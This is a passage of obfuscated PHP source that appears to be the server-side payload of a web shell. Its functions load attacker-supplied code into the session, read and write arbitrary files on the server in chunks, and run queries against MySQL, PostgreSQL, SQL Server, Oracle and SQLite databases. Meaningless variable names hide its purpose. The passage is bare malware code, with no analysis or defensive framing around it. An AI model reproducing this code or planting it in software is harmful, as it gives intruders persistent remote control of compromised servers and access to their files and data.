mysql_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}else if(function_existsEx("mysqli_connect")){return mysqliEx_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}}elseif($ccccccccc=="postgresql"&&function_existsEx("pg_connect")){if(function_existsEx("pg_connect")){return pg_execEx($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}}elseif($ccccccccc=="sqlserver"&&(function_existsEx("sqlsrv_connect")||function_existsEx("mssql_connect"))){if(function_existsEx("sqlsrv_connect")){return sqlsrv_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii);}elseif(function_existsEx("mssql_connect")){return mssql_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii);}}elseif($ccccccccc=="oracle"&&(function_existsEx("oci_connect")||function_existsEx("ora_plogon"))){if(function_existsEx("oci_connect")){return oci_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}else if(function_existsEx("ora_plogon")){return oci_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}}elseif($ccccccccc=="sqlite"&&class_exists("SQLite3")){return sqlite_exec($ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii,$jjjjjjjjj);}if(extension_loaded("pdo")){return pdoExec($ccccccccc,$ddddddddd,$eeeeeeeee,$fffffffff,$ggggggggg,$hhhhhhhhh,$kkkkkkkkk,$iiiiiiiii);}else{return"no extension";}}function base64Encode($vvvvvv){return base64_encode($vvvvvv);}function test(){return"ok";}function get($lllllll){global $c;if(isset($c[$lllllll])){return $c[$lllllll];}else{return null;}}function getAllParameters(){global $c;return $c;}function includeCode(){$tttttttttt=get("binCode");$uuuuuuuuuu=get("codeName");$d=&getSession();$d[$uuuuuuuuuu]=$tttttttttt;return"ok";}function base64Decode($vvvvvvvvvv){return base64_decode($vvvvvvvvvv);}function convertFilePermissions($wwwwwwwwww){$gggggggggg=0;if(strpos($wwwwwwwwww,'R')!==false){$gggggggggg=$gggggggggg+0444;}if(strpos($wwwwwwwwww,'W')!==false){$gggggggggg=$gggggggggg+0222;}if(strpos($wwwwwwwwww,'X')!==false){$gggggggggg=$gggggggggg+0111;}return $gggggggggg;}function g_close(){@session_start();$d=&getSession();$d=null;if(@session_destroy()){return"ok";}else{return"fail!";}}function bigFileDownload(){$xxxxxxxxxx=get("mode");$bbbbbbb=get("fileName");$yyyyyyyyyy=get("readByteNum");$zzzzzzzzzz=get("position");if($xxxxxxxxxx=="fileSize"){return@filesize($bbbbbbb)."";}elseif($xxxxxxxxxx=="read"){if(function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){$ccccccc=fopen($bbbbbbb,"rb");if($ccccccc!==false){@fseek($ccccccc,$zzzzzzzzzz);$vvvvvv=fread($ccccccc,$yyyyyyyyyy);@fclose($ccccccc);if($vvvvvv!==false){return $vvvvvv;}else{return"cannot read file";}}else{return"cannot open file";}}else if(function_existsEx("file_get_contents")){return file_get_contents($bbbbbbb,false,null,$zzzzzzzzzz,$yyyyyyyyyy);}else{return"no function";}}else{return"no mode";}}function bigFileUpload(){$bbbbbbb=get("fileName");$aaaaaaaaaaa=get("fileContents");$zzzzzzzzzz=get("position");if(function_existsEx("fopen")&&function_existsEx("fwrite")&&function_existsEx("fseek")){$ccccccc=fopen($bbbbbbb,"ab");if($ccccccc!==false){fseek($ccccccc,$zzzzzzzzzz);$ddddddd=fwrite($ccccccc,$aaaaaaaaaaa);@fclose($ccccccc);if($ddddddd!==false){return"ok";}else{return"cannot write file";}}else{return"cannot open file";}}else if(function_existsEx("file_put_contents")){if(file_put_contents($bbbbbbb,$aaaaaaaaaaa,FILE_APPEND)!==false){return"ok";}else{return"writer fail";}}else{return"no function";}}function canCallGzipEncode(){if(function_existsEx("gzencode")){return"1";}else{return"0";}}function canCallGzipDecode(){if(function_existsEx("gzdecode")){return"1";}else{return"0";}}function bytesToInteger($bbbbbbbbbbb,$zzzzzzzzzz){$ccccccccccc=0;$ccccccccccc=$bbbbbbbbbbb[$zzzzzzzzzz+3]&0xff;$ccccccccccc<<=8;$ccccccccccc|=$bbbbbbbbbbb[$zzzzzzzzzz+2]&0xff;$ccccccccccc<<=8;$ccccccccccc|=$bbbbbbbbbbb[$zzzzzzzzzz+1]&0xff;$ccccccccccc<<=8;$ccccccccccc|=$bbbbbbbbbbb[$zzzzzzzzzz]&0xff;return $ccccccccccc;}function isGzipStream($ddddddddddd){if(strlen($ddddddddddd)>=2){$ddddddddddd=substr($ddddddddddd,0,2);$eeeeeeeeeee=@unpack("C2chars",$ddddddddddd);$fffffffffff=intval($eeeeeeeeeee['chars1'].$eeeeeeeeeee['chars2']);switch($fffffffffff){case 31139:return true;default:return false;}}else{return false;}}function getBytes($vvvvvvvvvv){$bbbbbbbbbbb=array();for($rrrrrr=0;$rrrrrr<strlen($vvvvvvvvvv);$rrrrrr++){array_push($bbbbbbbbbbb,ord($vvvvvvvvvv[$rrrrrr]));}return $bbbbbbbbbbb;}